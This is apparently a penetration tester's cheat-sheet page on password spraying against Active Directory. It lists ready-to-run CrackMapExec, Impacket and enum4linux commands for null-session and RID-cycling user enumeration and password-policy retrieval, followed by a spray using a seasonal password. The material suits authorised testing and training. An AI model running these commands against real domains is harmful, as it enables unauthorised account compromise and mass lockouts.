---
description: Methodology for performing password spraying attacks against active directory
---

# Password Spraying Active Directory

### Obtain Password Policy

<pre class="language-bash"><code class="lang-bash"><strong># Get Password Policy with CrackMapExec (Unauthenticated)
</strong>cme smb $dc -u '' -p ''
<strong>
</strong><strong># Get Password Policy with CrackMapExec
</strong>crackmapexec smb $dc -u $username -p $password --pass-pol

# Get Password Policy with Net Accounts
net accounts</code></pre>

### Get List of Users

<pre class="language-bash"><code class="lang-bash"># Get List of Users with CrackMapExec via RID Cycling (Unauthenticated)
crackmapexec smb $dc -u '' -p '' --users
crackmapexec smb $dc -u '' -p '' --groups

# Get List of Users with CrackMapExec via RID Cycling
crackmapexec smb $dc -u $username -p $password --users

# Get List of Users with Impacket
GetADUsers.py $domain/$username:$password -all -dc-ip $dc

# Get List of Users with Enum4linux
enum4linux $dc -u $username -p $password -U

<strong># Sort Usernames Obtained from Enum4Linux 
</strong>cat usernameenum.txt | grep "user" | awk {'print $1'} | cut -d '[' -f 2 | cut -d ']' -f 1 | sort -u -f > UsernameList.txt</code></pre>

### Spraying

```bash
# Spray with CrackMapExec
crackmapexec smb $ip -u $username_list -p Winter2022! --continue-on-success
```

### References

{% embed url="https://wiki.porchetta.industries/smb-protocol/enumeration/enumerate-null-sessions" %}
